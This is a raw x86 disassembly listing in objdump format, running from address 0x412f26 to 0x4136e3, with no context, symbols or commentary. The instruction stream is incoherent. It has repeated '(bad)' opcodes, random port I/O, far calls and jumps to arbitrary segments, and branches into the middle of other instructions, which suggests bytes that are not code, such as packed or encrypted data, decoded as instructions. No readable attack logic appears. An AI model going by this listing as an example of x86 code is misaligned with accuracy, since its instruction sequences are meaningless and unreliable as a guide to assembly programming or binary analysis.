  412f26:	lods   al,BYTE PTR ds:[esi]
  412f27:	xchg   ebx,eax
  412f28:	xchg   esi,edi
  412f2a:	shl    bh,1
  412f2c:	arpl   cx,di
  412f2e:	xchg   esi,eax
  412f2f:	pop    ecx
  412f30:	mov    esi,0x2222e918
  412f35:	mov    edi,0x3877a0fa
  412f3a:	adc    al,0x39
  412f3c:	sbb    DWORD PTR [ecx],esp
  412f3e:	adc    eax,0x802ddcf7
  412f43:	jge    0x412f8c
  412f45:	mov    bl,BYTE PTR [eax+0x2f]
  412f48:	out    dx,al
  412f49:	mov    esi,0x5de03551
  412f4e:	into   
  412f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f50:	sti    
  412f51:	mov    DWORD PTR [ebx+0x9a1733],esi
  412f57:	(bad)  
  412f58:	into   
  412f59:	mov    al,0xcc
  412f5b:	cmp    al,0xcc
  412f5d:	mov    al,ds:0x8d0a570f
  412f62:	add    al,0x89
  412f64:	push   ss
  412f65:	neg    BYTE PTR [ecx+0x12]
  412f68:	add    eax,0xdd61a4b4
  412f6d:	imul   ebx,edx,0x738f2bba
  412f73:	mov    bh,0xf2
  412f75:	or     eax,0xd5f6dac6
  412f7a:	and    dh,dh
  412f7c:	pop    edi
  412f7d:	ret    0x858c
  412f80:	stc    
  412f81:	jp     0x412f10
  412f83:	pop    esp
  412f84:	or     al,BYTE PTR [eax+0x58cd4fdd]
  412f8a:	(bad)  
  412f8b:	out    0xb8,eax
  412f8d:	and    al,0x63
  412f8f:	xchg   esi,eax
  412f90:	inc    edx
  412f91:	cmp    dh,bh
  412f93:	cmp    al,0x9d
  412f95:	sub    eax,0x763969f5
  412f9a:	imul   ebp,DWORD PTR [ebp-0xb],0x1c9b2697
  412fa1:	xchg   edi,eax
  412fa2:	addr16 stc 
  412fa4:	lahf   
  412fa5:	xor    bl,BYTE PTR [eax+0x4d]
  412fa8:	sbb    ch,BYTE PTR [edx]
  412faa:	mul    DWORD PTR [edi+0x4b78bca2]
  412fb0:	push   edi
  412fb1:	mov    DWORD PTR ds:0x3bf95dfd,eax
  412fb7:	mov    bl,0x29
  412fb9:	xchg   esp,eax
  412fba:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fbc:	sub    DWORD PTR [esi+esi*4-0x7e],edi
  412fc0:	and    eax,0xae42f081
  412fc5:	stos   DWORD PTR es:[edi],eax
  412fc6:	and    al,BYTE PTR [ebx+0x29e1be1b]
  412fcc:	xchg   ebp,eax
  412fcd:	sti    
  412fce:	lods   al,BYTE PTR gs:[esi]
  412fd0:	rcl    BYTE PTR [ebx+0x20],1
  412fd3:	ds nop
  412fd5:	adc    DWORD PTR [edi+0xb],edi
  412fd8:	nop
  412fd9:	and    al,0x56
  412fdb:	mov    edi,0x99cb36c4
  412fe0:	mov    cl,0xeb
  412fe2:	xor    al,0x17
  412fe4:	lods   eax,DWORD PTR ds:[esi]
  412fe5:	rol    eax,1
  412fe7:	mov    esi,0x56735d40
  412fec:	adc    eax,0x8d2f5185
  412ff1:	cmc    
  412ff2:	ins    BYTE PTR es:[edi],dx
  412ff3:	xchg   ecx,eax
  412ff4:	xlat   BYTE PTR ds:[ebx]
  412ff5:	shl    DWORD PTR [edi],cl
  412ff7:	stos   BYTE PTR es:[edi],al
  412ff8:	mov    esi,0xae5bf403
  412ffd:	adc    dl,al
  412fff:	lea    esp,[ebx+ebx*4-0x24]
  413003:	mov    ecx,0x4358f32e
  413008:	lea    ecx,[eax+edx*2-0x25e194c2]
  41300f:	addr16 xor eax,0x8f7424fb
  413015:	sub    al,0x1e
  413017:	int    0x74
  413019:	lahf   
  41301a:	fnstsw ax
  41301c:	push   eax
  41301d:	shl    DWORD PTR [ebx+0x15b437bf],0x6b
  413024:	and    BYTE PTR [eax-0x21],bl
  413027:	xchg   DWORD PTR [edi-0x1f],esi
  41302a:	push   esi
  41302b:	(bad)  
  41302c:	(bad)  
  41302d:	icebp  
  41302e:	sbb    DWORD PTR [edx-0x39ba690d],ebx
  413034:	sub    BYTE PTR [edi-0x583b450],dh
  41303a:	adc    al,0x1
  41303c:	push   ss
  41303d:	out    dx,eax
  41303e:	aam    0xec
  413040:	mov    al,ds:0xca9a0262
  413045:	ss push ebp
  413047:	ins    BYTE PTR es:[edi],dx
  413048:	out    0x1f,eax
  41304a:	push   ss
  41304b:	pushf  
  41304c:	add    BYTE PTR [ecx+ebx*1-0x35],0x7
  413051:	cmp    BYTE PTR [edi+ebp*2],bl
  413054:	data16 hlt 
  413056:	jnp    0x4130bf
  413058:	out    0x86,eax
  41305a:	std    
  41305b:	adc    dl,BYTE PTR [edi]
  41305d:	outs   dx,DWORD PTR ds:[esi]
  41305e:	add    esi,edx
  413060:	(bad)  
  413061:	push   eax
  413062:	cmc    
  413063:	test   al,0x3d
  413065:	mov    ch,0xdc
  413067:	(bad)  
  413068:	mov    bl,0xac
  41306a:	sub    eax,0x4f623eba
  41306f:	(bad)  
  413070:	scas   al,BYTE PTR es:[edi]
  413071:	popf   
  413072:	in     al,0xb8
  413074:	and    ebp,DWORD PTR [ebx-0x70]
  413077:	dec    ecx
  413078:	sahf   
  413079:	ret    0xcc0b
  41307c:	inc    edi
  41307d:	jb     0x4130c3
  41307f:	repnz sub BYTE PTR [ebp-0x3e76b53b],bh
  413086:	pop    ecx
  413087:	icebp  
  413088:	pushf  
  413089:	nop
  41308a:	test   esp,0xeb95e63f
  413090:	in     eax,0x53
  413092:	sbb    DWORD PTR [eax+0x7b1d6c75],esp
  413098:	add    ecx,ebx
  41309a:	fist   WORD PTR [ecx+0x4f]
  41309d:	pop    ds
  41309e:	jl     0x413091
  4130a0:	sbb    dl,BYTE PTR [esi+0x3e36b7b6]
  4130a6:	daa    
  4130a7:	(bad)  
  4130a8:	dec    esi
  4130a9:	mov    bl,0x93
  4130ab:	sbb    al,BYTE PTR [ecx+0x26]
  4130ae:	lods   al,BYTE PTR ds:[esi]
  4130af:	enter  0x10a0,0x20
  4130b3:	push   cs
  4130b4:	dec    DWORD PTR ds:0x9197431d
  4130ba:	ret    0x6223
  4130bd:	scas   eax,DWORD PTR es:[edi]
  4130be:	loop   0x413115
  4130c0:	jp     0x413112
  4130c2:	cwde   
  4130c3:	ja     0x41309c
  4130c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c6:	iret   
  4130c7:	into   
  4130c8:	test   al,0x20
  4130ca:	sub    al,0xa
  4130cc:	add    esp,DWORD PTR es:[esi-0x16876ab0]
  4130d3:	jmp    0x8f6e:0x3425c7b5
  4130da:	and    al,0xce
  4130dc:	dec    edi
  4130dd:	icebp  
  4130de:	leave  
  4130df:	xchg   edx,eax
  4130e0:	inc    ebp
  4130e1:	sub    BYTE PTR [eax],bh
  4130e3:	call   0xc5e5:0xfd098b28
  4130ea:	data16 icebp 
  4130ec:	retf   0x2766
  4130ef:	arpl   si,cx
  4130f1:	cwde   
  4130f2:	enter  0xc02f,0x2a
  4130f6:	jnp    0x413101
  4130f8:	ss jecxz 0x413144
  4130fb:	xchg   esp,eax
  4130fc:	cmp    eax,0xd62ee67
  413101:	imul   ecx,DWORD PTR [edx-0x34],0x18
  413105:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413107:	cmp    ch,BYTE PTR [ebx]
  413109:	lahf   
  41310a:	es call 0x570c1915
  413110:	stos   BYTE PTR es:[edi],al
  413111:	lods   eax,DWORD PTR ds:[esi]
  413112:	aaa    
  413113:	addr16 cli 
  413115:	push   0x74
  413117:	adc    eax,0xe52c0f6
  41311c:	lds    eax,FWORD PTR ds:0xcc50b200
  413122:	xchg   edx,eax
  413123:	(bad)  
  413124:	dec    ebp
  413125:	mov    bl,0xda
  413127:	scas   al,BYTE PTR es:[edi]
  413128:	cdq    
  413129:	dec    ebx
  41312a:	jp     0x41315b
  41312c:	aas    
  41312d:	outs   dx,DWORD PTR ds:[esi]
  41312e:	jmp    0x4131a2
  413130:	outs   dx,DWORD PTR ds:[esi]
  413131:	adc    eax,0x42774a2e
  413136:	test   DWORD PTR [edi-0x5dfd8c89],0x405ff4e5
  413140:	mov    bh,0x45
  413142:	mov    dl,0x44
  413144:	lock mov bh,0xcb
  413147:	out    dx,al
  413148:	mov    bl,BYTE PTR [eax]
  41314a:	xchg   edx,eax
  41314b:	(bad)  
  41314c:	push   eax
  41314d:	push   es
  41314e:	sub    eax,0x6e2a1b58
  413153:	mov    al,ds:0xb6cae5de
  413158:	pop    ds
  413159:	and    al,BYTE PTR [esi]
  41315b:	fild   DWORD PTR [ecx]
  41315d:	in     eax,0x46
  41315f:	repz cs cmp al,0xf6
  413163:	rcl    DWORD PTR [edx-0x32acc4a5],0xad
  41316a:	xchg   esp,eax
  41316b:	and    DWORD PTR [edi+0x5bea5b5b],ebx
  413171:	pop    fs
  413173:	pop    es
  413174:	lds    esi,FWORD PTR [ebx]
  413176:	cmp    BYTE PTR [ebp+0x3794f059],ch
  41317c:	sub    dl,al
  41317e:	mov    esp,0x8cd6c14d
  413183:	jo     0x413181
  413185:	ss addr16 xchg ecx,eax
  413188:	ret    
  413189:	popf   
  41318a:	scas   eax,DWORD PTR es:[edi]
  41318b:	enter  0xfa64,0x59
  41318f:	pop    ss
  413190:	mov    ds:0xbeebf726,al
  413195:	sar    BYTE PTR [edi-0x4ebe3654],cl
  41319b:	ins    BYTE PTR es:[edi],dx
  41319c:	xchg   ecx,eax
  41319d:	dec    esi
  41319e:	xor    ch,BYTE PTR [edx+0x0]
  4131a1:	fild   WORD PTR [ecx]
  4131a3:	pop    es
  4131a4:	es pushf 
  4131a6:	xchg   ecx,eax
  4131a7:	fcom   DWORD PTR [ebp-0x77]
  4131aa:	mov    cl,0x5d
  4131ac:	xor    eax,0x77413a99
  4131b1:	cmp    BYTE PTR [esi],ch
  4131b3:	fs xor ecx,eax
  4131b6:	inc    ecx
  4131b7:	lahf   
  4131b8:	aas    
  4131b9:	sbb    eax,0xb8040863
  4131be:	xchg   edi,eax
  4131bf:	mov    ds:0x84cb7121,eax
  4131c4:	test   DWORD PTR [esi],esp
  4131c6:	mov    ecx,0x62cf1b57
  4131cb:	sbb    DWORD PTR [edx],ebx
  4131cd:	push   ebp
  4131ce:	push   ebx
  4131cf:	ins    DWORD PTR es:[edi],dx
  4131d0:	push   0x9cd10235
  4131d5:	dec    ebp
  4131d6:	je     0x413189
  4131d8:	and    al,0x20
  4131da:	push   ebx
  4131db:	(bad)  
  4131dd:	add    dl,dl
  4131df:	aam    0x11
  4131e1:	ja     0x4131f2
  4131e3:	fidivr DWORD PTR ds:0x873ce5a7
  4131e9:	in     eax,dx
  4131ea:	aam    0x6
  4131ec:	cmp    ax,0x9bf
  4131f0:	xlat   BYTE PTR ds:[ebx]
  4131f1:	or     DWORD PTR [ecx-0xd6d19fa],eax
  4131f7:	adc    eax,0xbbe779da
  4131fc:	sbb    eax,0xd7948331
  413201:	pop    edi
  413202:	fstp   QWORD PTR [eax+0x32779621]
  413208:	pop    esi
  413209:	add    ecx,edi
  41320b:	jnp    0x4131b6
  41320d:	enter  0xbd58,0x73
  413211:	test   eax,0xb13ebe3c
  413216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413217:	aad    0xeb
  413219:	sahf   
  41321a:	cli    
  41321b:	fs xchg ecx,eax
  41321d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41321e:	mov    esi,0xb133a9a6
  413223:	lods   al,BYTE PTR ds:[esi]
  413224:	int3   
  413225:	stos   DWORD PTR es:[edi],eax
  413226:	fdivr  DWORD PTR [ebx]
  413228:	sub    edi,edx
  41322a:	and    BYTE PTR [edi+0x6a4b1b6],0x9b
  413231:	lods   al,BYTE PTR ds:[esi]
  413232:	shl    BYTE PTR [ebp-0x32d5a8b7],0xe2
  413239:	and    ecx,DWORD PTR [ebp+edx*2+0x14]
  41323d:	dec    ecx
  41323e:	jge    0x413238
  413240:	add    eax,edx
  413242:	inc    ebp
  413243:	xchg   BYTE PTR [esi],bl
  413245:	mov    al,ds:0x55119e74
  41324a:	popf   
  41324b:	sbb    bh,dh
  41324d:	ficom  DWORD PTR [eax+0x1c]
  413250:	inc    ebx
  413251:	push   es
  413252:	push   0x4aef433c
  413257:	jo     0x4132a5
  413259:	push   0x1f
  41325b:	scas   al,BYTE PTR es:[edi]
  41325c:	bound  ebx,QWORD PTR [eax]
  41325e:	sub    edi,esi
  413260:	int    0xc5
  413262:	adc    al,0x5c
  413264:	and    al,0x41
  413266:	push   0xcba650ec
  41326b:	imul   ecx,DWORD PTR [eax-0x24],0x3a
  41326f:	lods   al,BYTE PTR ds:[esi]
  413270:	hlt    
  413271:	loopne 0x41326e
  413273:	retf   0x810
  413276:	add    ebx,edx
  413278:	inc    ecx
  413279:	es cs adc al,0xd1
  41327d:	icebp  
  41327e:	xchg   esp,eax
  41327f:	sar    DWORD PTR [edx-0x39b239ba],0xc0
  413286:	pop    eax
  413287:	lds    edx,FWORD PTR [esi+0x55]
  41328a:	xchg   BYTE PTR [eax+0x7d],al
  41328d:	push   ecx
  41328e:	iret   
  41328f:	xchg   edi,eax
  413290:	xor    eax,0x1bbfae58
  413295:	mov    bh,0xe
  413297:	and    DWORD PTR [edi-0x68],0x2464c109
  41329e:	test   al,0xed
  4132a0:	sbb    eax,0x7e01f463
  4132a5:	or     dl,BYTE PTR [esi]
  4132a7:	aad    0xf8
  4132a9:	cmp    dl,al
  4132ab:	push   cs
  4132ac:	mov    edi,0xee0eeee2
  4132b1:	popa   
  4132b2:	pop    esi
  4132b3:	mov    ch,0x70
  4132b5:	sbb    BYTE PTR [edi],al
  4132b7:	stos   BYTE PTR es:[edi],al
  4132b8:	test   al,0xe
  4132ba:	push   cs
  4132bb:	inc    edx
  4132bc:	xor    al,0xd3
  4132be:	stos   DWORD PTR es:[edi],eax
  4132bf:	fiadd  DWORD PTR [ebp+ebp*1+0x4abbdd6c]
  4132c6:	mov    al,0x2d
  4132c8:	shl    BYTE PTR [edx],0xe9
  4132cb:	pop    es
  4132cc:	adc    ebp,DWORD PTR [edx+0x1470152a]
  4132d2:	add    eax,0x6b4ab14b
  4132d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132d8:	add    cl,BYTE PTR [ebx]
  4132da:	and    al,BYTE PTR [esi]
  4132dc:	out    0x35,eax
  4132de:	push   ebp
  4132df:	and    al,0x8b
  4132e1:	imul   edi,edi,0xa729dfce
  4132e7:	or     DWORD PTR [esi+0x2e],0x5f2490aa
  4132ee:	sbb    DWORD PTR [esi*2-0x374cbd88],0x73
  4132f6:	xchg   edx,eax
  4132f7:	and    eax,DWORD PTR [ebp+0x60acbaef]
  4132fd:	pop    es
  4132fe:	lahf   
  4132ff:	(bad)  
  413300:	adc    al,0x6d
  413302:	call   0x8253:0xf10d6eb3
  413309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41330a:	sahf   
  41330b:	lds    ecx,FWORD PTR [eax+edx*4-0x5fae486c]
  413312:	lds    ebx,FWORD PTR [eax+0x4fe337a7]
  413318:	xchg   ecx,eax
  413319:	pop    ecx
  41331a:	adc    bl,BYTE PTR [edx]
  41331c:	pusha  
  41331d:	and    eax,0x631b97e
  413322:	xchg   ebp,eax
  413323:	pop    edi
  413324:	inc    edx
  413325:	lods   al,BYTE PTR ds:[esi]
  413326:	retf   
  413327:	shr    BYTE PTR [edx-0x41],0x2f
  41332b:	cmp    al,dl
  41332d:	xchg   edi,eax
  41332e:	jmp    0x4133a3
  413330:	cmp    al,0xde
  413332:	xchg   esi,eax
  413333:	ficomp WORD PTR [esi]
  413335:	mov    dl,0xa2
  413337:	add    al,BYTE PTR [ecx]
  413339:	mov    ebp,DWORD PTR ds:0xa29a472
  41333f:	adc    al,0x24
  413341:	in     al,0x6
  413343:	clc    
  413344:	mov    DWORD PTR [ecx+0x2b],ecx
  413347:	mov    cs,WORD PTR [ecx-0x7d214c98]
  41334d:	fistp  DWORD PTR [ebp-0x7c]
  413350:	js     0x413336
  413352:	jecxz  0x413371
  413354:	ror    esp,cl
  413356:	test   al,0x10
  413358:	std    
  413359:	pop    esi
  41335a:	xor    al,0xd2
  41335c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41335d:	adc    dh,ch
  41335f:	and    dl,al
  413361:	repz xchg edi,eax
  413363:	xor    esp,ecx
  413365:	jae    0x4133ab
  413367:	push   edx
  413368:	xor    DWORD PTR [esi+0x6302df9d],edx
  41336e:	inc    ebp
  41336f:	aaa    
  413370:	and    esi,DWORD PTR [esi+0x242f9f18]
  413376:	rcl    DWORD PTR [edx-0x68718c6a],0xc
  41337d:	sub    BYTE PTR [eax+esi*8],bl
  413380:	out    0x76,al
  413382:	xchg   ecx,eax
  413383:	pop    ds
  413384:	or     ebp,DWORD PTR [edx]
  413386:	dec    ebp
  413387:	inc    esp
  413388:	fdiv   QWORD PTR [eax+0x4f]
  41338b:	ret    
  41338c:	shl    DWORD PTR [esi],cl
  41338e:	sbb    BYTE PTR [ecx+0x3c],bl
  413391:	jl     0x4133f2
  413393:	mov    ds:0x922a88da,al
  413398:	push   ebp
  413399:	push   edx
  41339a:	out    0x2f,eax
  41339c:	jb     0x4133a6
  41339e:	pop    esp
  41339f:	mov    al,0xbf
  4133a1:	mov    ds:0xaa5a83f0,eax
  4133a6:	loop   0x413427
  4133a8:	or     cx,WORD PTR [ebp+edx*4+0x10]
  4133ad:	mov    eax,0x2b031f56
  4133b2:	add    edx,eax
  4133b4:	lea    eax,[ecx]
  4133b6:	repnz iret 
  4133b8:	ret    0xd22a
  4133bb:	cmc    
  4133bc:	xchg   DWORD PTR [edi-0x66169780],ebp
  4133c2:	or     ah,dl
  4133c4:	rol    dl,cl
  4133c6:	jo     0x41335a
  4133c8:	mov    WORD PTR [ecx-0x29],fs
  4133cb:	mov    ebp,0xb5b2a9b0
  4133d0:	test   al,0xa4
  4133d2:	test   al,0x90
  4133d4:	pop    eax
  4133d5:	in     eax,0x49
  4133d7:	dec    ebp
  4133d8:	push   0xffffff9c
  4133da:	adc    bh,dh
  4133dc:	adc    al,0x41
  4133de:	shl    DWORD PTR [ecx-0x2777a974],cl
  4133e4:	fisttp QWORD PTR [edi-0xed8db94]
  4133ea:	and    BYTE PTR [edi],ah
  4133ec:	and    BYTE PTR [esi+0x1b78a6d3],dl
  4133f2:	dec    esi
  4133f3:	jmp    0x41344a
  4133f5:	data16 sbb al,al
  4133f8:	leave  
  4133f9:	push   eax
  4133fa:	out    0x46,al
  4133fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133fd:	or     al,0x6
  4133ff:	pop    esp
  413400:	pop    DWORD PTR [esi+edi*4-0x37]
  413404:	aas    
  413405:	fwait
  413406:	sbb    eax,0x9d5cc14f
  41340b:	sub    ebp,edi
  41340d:	push   edi
  41340e:	shr    BYTE PTR [ecx],1
  413410:	xor    edx,DWORD PTR [eax]
  413412:	push   edi
  413413:	fild   WORD PTR [edi]
  413415:	fcom   DWORD PTR [esi+0x7]
  413418:	scas   al,BYTE PTR es:[edi]
  413419:	jo     0x413469
  41341b:	sub    DWORD PTR [edi],0xffffffea
  41341e:	or     al,0x1e
  413420:	inc    ebx
  413421:	or     ch,BYTE PTR [edx]
  413423:	stc    
  413424:	sub    BYTE PTR [edx-0xb4040f0],cl
  41342a:	or     eax,0x42dfef04
  41342f:	ins    BYTE PTR es:[edi],dx
  413430:	(bad)  
  413431:	cli    
  413432:	xchg   BYTE PTR [esi],ch
  413434:	dec    eax
  413435:	and    dl,cl
  413437:	dec    ax
  413439:	mov    bh,0x0
  41343b:	jecxz  0x4134bc
  41343d:	loopne 0x4133da
  41343f:	out    0x9,al
  413441:	sub    BYTE PTR ss:[ebp+0x8],cl
  413445:	sbb    esi,ebx
  413447:	cmp    DWORD PTR [ecx-0x4a564c6c],ebx
  41344d:	ss xchg ebp,eax
  41344f:	ret    0xf2d9
  413452:	sti    
  413453:	out    dx,al
  413454:	ins    DWORD PTR es:[edi],dx
  413455:	jle    0x4133e5
  413457:	jb     0x4133e7
  413459:	adc    BYTE PTR [ebp+ebx*1-0x2d],0x4e
  41345e:	push   ds
  41345f:	add    al,0x3b
  413461:	test   eax,0x7881cb35
  413466:	push   ecx
  413467:	call   0x44c2082e
  41346c:	mov    al,0x2e
  41346e:	mov    DWORD PTR [esi],esp
  413470:	imul   ebp,DWORD PTR [esi+0x36],0x3
  413474:	add    cl,BYTE PTR [esi-0x6b6dd7f5]
  41347a:	shr    BYTE PTR [eax],cl
  41347c:	cmp    esi,DWORD PTR [ebp+0x52f096f1]
  413482:	fwait
  413483:	sub    DWORD PTR [edi+0x52b5f348],edi
  413489:	scas   al,BYTE PTR es:[edi]
  41348a:	or     ebp,DWORD PTR [ebx]
  41348c:	fucomip st,st(1)
  41348e:	jns    0x41345f
  413490:	or     edx,DWORD PTR [ecx+0x4e]
  413493:	fstp   QWORD PTR [edx]
  413495:	jne    0x4134b1
  413497:	leave  
  413498:	shl    DWORD PTR [ecx-0x74da70a5],cl
  41349e:	xchg   edx,eax
  41349f:	xchg   ecx,eax
  4134a0:	neg    esi
  4134a2:	pop    edi
  4134a3:	sub    BYTE PTR [edx+ebp*1+0x6b],ah
  4134a7:	fucomi st,st(7)
  4134a9:	xchg   edx,eax
  4134aa:	cmp    DWORD PTR [edi-0x68],edx
  4134ad:	jp     0x413477
  4134af:	xchg   edx,eax
  4134b0:	push   ss
  4134b1:	addr16 xor esp,ebx
  4134b4:	jg     0x413510
  4134b6:	ret    
  4134b7:	inc    edi
  4134b8:	jecxz  0x413518
  4134ba:	or     DWORD PTR [ecx-0x60],ecx
  4134bd:	daa    
  4134be:	imul   ecx,DWORD PTR [ecx+edx*4],0xc5f7d157
  4134c5:	inc    edx
  4134c6:	pop    ss
  4134c7:	push   0xc4e7adbc
  4134cc:	xor    bl,BYTE PTR [ebx]
  4134ce:	(bad)  
  4134cf:	rcl    BYTE PTR [ebx+ebp*4],cl
  4134d2:	sbb    esp,DWORD PTR [ebx]
  4134d4:	and    ebp,DWORD PTR [edi+0x4443ed4a]
  4134da:	cmp    eax,0xd34e90c7
  4134df:	js     0x41355b
  4134e1:	imul   ecx,DWORD PTR [esi+0x1ba7c3b6],0xbbce1ff3
  4134eb:	fwait
  4134ec:	cmc    
  4134ed:	imul   edx,edi,0xdb7f2de5
  4134f3:	test   bh,bh
  4134f5:	enter  0x5846,0xf6
  4134f9:	outs   dx,BYTE PTR ds:[esi]
  4134fa:	sbb    edx,DWORD PTR es:[edx]
  4134fd:	cmp    DWORD PTR [ebp+eax*2-0x69],0x457158c0
  413505:	imul   esp,DWORD PTR [edx+ecx*1+0x182632f5],0xffffffe7
  41350d:	dec    ebx
  41350e:	jp     0x4134a5
  413510:	out    dx,al
  413511:	imul   ebx,DWORD PTR [esi],0xb0ab2c93
  413517:	sbb    eax,0x274347b3
  41351c:	(bad)  
  41351d:	mov    DWORD PTR [eax+0x45],ecx
  413520:	cmp    DWORD PTR [esi+0x52],ecx
  413523:	outs   dx,DWORD PTR ds:[esi]
  413524:	out    0x8c,al
  413526:	and    DWORD PTR [ebp-0x7c28fd7a],0xfabbcfe
  413530:	lds    edx,FWORD PTR [esi]
  413532:	pushf  
  413533:	sbb    esi,DWORD PTR [edi-0xd1f1ad2]
  413539:	sar    dh,1
  41353b:	add    al,0x89
  41353d:	fsubr  DWORD PTR [esi-0x70]
  413540:	sub    cl,dl
  413542:	cmc    
  413543:	stc    
  413544:	sub    al,0xc7
  413546:	lea    edi,[eax+eax*2-0x2d58a319]
  41354d:	dec    esi
  41354e:	or     al,0x27
  413550:	xor    eax,0x407d497a
  413555:	xchg   edi,eax
  413556:	sub    DWORD PTR ds:0x345953f2,0x430e1bd6
  413560:	ja     0x413536
  413562:	inc    ecx
  413563:	fnstsw WORD PTR [ebp-0x11c64e28]
  413569:	mov    es,edi
  41356b:	adc    BYTE PTR [ecx+0x3e81c3e6],al
  413571:	adc    BYTE PTR [ebx-0x7b0ec102],bh
  413577:	push   ebp
  413578:	stos   BYTE PTR es:[edi],al
  413579:	sub    al,0xaf
  41357b:	jnp    0x413535
  41357d:	shr    cl,0xaa
  413580:	rcr    BYTE PTR [edi],1
  413582:	inc    ebp
  413583:	test   al,0x45
  413585:	mov    al,0xb3
  413587:	dec    edx
  413588:	stos   DWORD PTR es:[edi],eax
  413589:	mov    eax,0x2d720531
  41358e:	mov    ecx,ebp
  413590:	int3   
  413591:	ret    
  413592:	les    ebx,FWORD PTR [esi+0x39]
  413595:	pop    ecx
  413596:	stc    
  413597:	aaa    
  413598:	push   0xcfc4e1b4
  41359d:	aas    
  41359e:	and    bh,BYTE PTR [esi]
  4135a0:	pop    es
  4135a1:	inc    edx
  4135a2:	pusha  
  4135a3:	out    dx,al
  4135a4:	or     eax,0x365f23e0
  4135a9:	call   0xdd61d946
  4135ae:	push   0x5d
  4135b0:	sti    
  4135b1:	jne    0x413608
  4135b3:	and    eax,DWORD PTR [edi-0x7b]
  4135b6:	test   bl,0xc3
  4135b9:	in     eax,0xcc
  4135bb:	popf   
  4135bc:	hlt    
  4135bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135be:	or     eax,0xb7e91309
  4135c3:	stos   DWORD PTR es:[edi],eax
  4135c4:	cli    
  4135c5:	cmp    al,0x26
  4135c7:	pop    ebp
  4135c8:	imul   edx,DWORD PTR [edx-0x3435d404],0xb9dc631e
  4135d2:	pop    ebx
  4135d3:	add    DWORD PTR ds:0xc6bf52a8,0x6f681b5f
  4135dd:	hlt    
  4135de:	test   cl,ah
  4135e0:	mov    dh,0x1a
  4135e2:	sbb    dl,BYTE PTR [ebx+0x38]
  4135e5:	cdq    
  4135e6:	and    bl,BYTE PTR ds:0x99d9382e
  4135ec:	rol    DWORD PTR [ebx+eiz*2],cl
  4135ef:	pop    edx
  4135f0:	(bad)  
  4135f1:	push   ss
  4135f2:	stos   DWORD PTR es:[edi],eax
  4135f3:	mov    WORD PTR [edx],?
  4135f5:	dec    edi
  4135f6:	mov    ecx,0xd5da6620
  4135fb:	or     al,0x70
  4135fd:	scas   eax,DWORD PTR es:[edi]
  4135fe:	and    eax,0x9ed79f31
  413603:	xchg   edi,eax
  413604:	inc    BYTE PTR ds:0x2a337ee0
  41360a:	xor    al,BYTE PTR [esp+edx*1-0x2db5e4d0]
  413611:	jg     0x413628
  413613:	stc    
  413614:	cmp    ah,BYTE PTR [eax-0x4]
  413617:	mov    ds:0xb003a7ef,eax
  41361c:	inc    esp
  41361d:	jmp    WORD PTR [ebp-0x53c1bb63]
  413624:	add    al,BYTE PTR [esi+0x11]
  413627:	mov    ebp,DWORD PTR [ebx+0x4d]
  41362a:	xor    BYTE PTR ds:0xbf66251c,ch
  413630:	test   DWORD PTR [ebx-0x7903e827],edi
  413636:	addr16 inc ecx
  413638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413639:	or     al,0xd1
  41363b:	jmp    0x41363a
  41363d:	ins    DWORD PTR es:[edi],dx
  41363e:	mov    al,0x73
  413640:	iret   
  413641:	or     BYTE PTR [ecx],dh
  413643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413644:	daa    
  413645:	int3   
  413646:	mov    cl,0x82
  413648:	cli    
  413649:	and    eax,0xc493c534
  41364e:	pop    eax
  41364f:	sub    BYTE PTR [eax-0x9],0x54
  413653:	mov    ah,0x98
  413655:	lods   al,BYTE PTR ds:[esi]
  413656:	std    
  413657:	fnstsw WORD PTR [esi+0x35]
  41365a:	int3   
  41365b:	(bad)  
  41365c:	icebp  
  41365d:	xor    esp,DWORD PTR [esp+ebx*8+0x29]
  413661:	pushf  
  413662:	dec    esi
  413663:	cdq    
  413664:	xchg   ecx,eax
  413665:	push   eax
  413666:	sbb    DWORD PTR [eax],esi
  413668:	jge    0x41366f
  41366a:	pop    ss
  41366b:	adc    DWORD PTR [ebx+0x2c],ebx
  41366e:	outs   dx,BYTE PTR ds:[esi]
  41366f:	(bad)  
  413670:	hlt    
  413671:	dec    esp
  413672:	mov    al,ds:0xd51ab7b5
  413677:	pop    ecx
  413678:	jbe    0x413658
  41367a:	inc    ebp
  41367b:	jp     0x413659
  41367d:	inc    esi
  41367e:	sbb    dh,BYTE PTR [ebx+0x7b]
  413681:	pushf  
  413682:	add    eax,0x1704429a
  413687:	xor    eax,0xee97ac7d
  41368c:	sub    eax,0xd97edf32
  413691:	inc    esi
  413692:	iret   
  413693:	iret   
  413694:	mov    bl,0xeb
  413696:	imul   esi,DWORD PTR [ecx],0xffffffe3
  413699:	add    BYTE PTR [ebx+0x23],al
  41369c:	out    dx,al
  41369d:	inc    ebx
  41369e:	hlt    
  41369f:	adc    al,0x15
  4136a1:	addr16 pop esp
  4136a3:	(bad)  
  4136a4:	xchg   edx,eax
  4136a5:	jo     0x4136e3
  4136a7:	mov    ebx,0x2484b5b9
  4136ac:	enter  0x4456,0x4c
  4136b0:	cli    
  4136b1:	jb     0x413721
  4136b3:	sbb    ah,BYTE PTR [ecx+0x1f2a9692]
  4136b9:	and    edi,DWORD PTR ds:0xc0431ff3
  4136bf:	imul   eax,DWORD PTR [ebp+ebx*2+0x56],0x9
  4136c4:	loop   0x413691
  4136c6:	mov    ah,0xaa
  4136c8:	pop    ds
  4136c9:	jl     0x41367f
  4136cb:	inc    edi
  4136cc:	inc    edx
  4136cd:	and    DWORD PTR [ebx],esi
  4136cf:	jmp    0x4c59fd27
  4136d4:	cmc    
  4136d5:	pop    eax
  4136d6:	or     eax,0x430761ca
  4136db:	fisttp WORD PTR [esi]
  4136dd:	sbb    cl,0xc2
  4136e0:	(bad)  
  4136e1:	sub    al,0x8f
  4136e3:	push   ds
